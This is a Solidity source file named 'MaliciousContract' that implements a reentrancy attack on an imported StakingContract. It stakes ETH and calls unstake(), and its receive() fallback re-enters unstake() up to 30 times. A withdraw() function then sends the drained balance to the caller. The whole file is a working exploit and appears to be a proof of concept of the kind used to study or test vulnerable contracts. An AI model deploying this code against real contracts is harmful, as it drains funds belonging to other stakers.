// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

// interface IStakingContract {
//     function stake() external payable;
//     function unstake() external;
// }
import "./StakingContract.sol";


contract MaliciousContract {
    StakingContract public stakingContract;
    uint public reentryAttacks = 0;
    uint public attackLimit = 30; // Limit to prevent out-of-gas errors

    constructor(address _stakingContract) {
        stakingContract = StakingContract(_stakingContract);
    }

    // Fallback function that is called when the contract receives Ether
    receive() external payable {
        if (reentryAttacks < attackLimit) {
            reentryAttacks++;
            stakingContract.unstake();
        }
    }

    function attack() public payable {
        require(msg.value > 0, "Send ETH to stake");
        stakingContract.stake{value: msg.value}(); // Stake the sent ETH
        stakingContract.unstake(); // Initiate unstake, which triggers reentrancy via the fallback
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
